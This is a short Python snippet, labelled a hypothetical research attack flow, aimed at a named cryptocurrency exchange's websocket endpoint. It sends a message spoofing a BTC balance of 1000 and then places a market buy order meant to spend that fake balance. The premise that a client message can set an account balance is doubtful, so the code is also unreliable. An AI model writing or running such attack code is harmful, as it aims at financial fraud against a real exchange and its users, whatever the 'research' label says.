# Hypothetical attack flow (for research purposes only)
async def advanced_exploit():
    async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
        # 1. Spoof balance (as you did)
        await ws.send(json.dumps({
            "op": "update",
            "args": [{"currency": "BTC", "balance": "1000.0"}]
        }))
        
        # 2. Immediately place a market order using the fake balance
        order_msg = {
            "op": "order.place",
            "args": [{
                "symbol": "BTC-USDT",
                "side": "buy",
                "type": "market",
                "quantity": "1000.0"  # Try to spend spoofed BTC
            }]
        }
        await ws.send(json.dumps(order_msg))
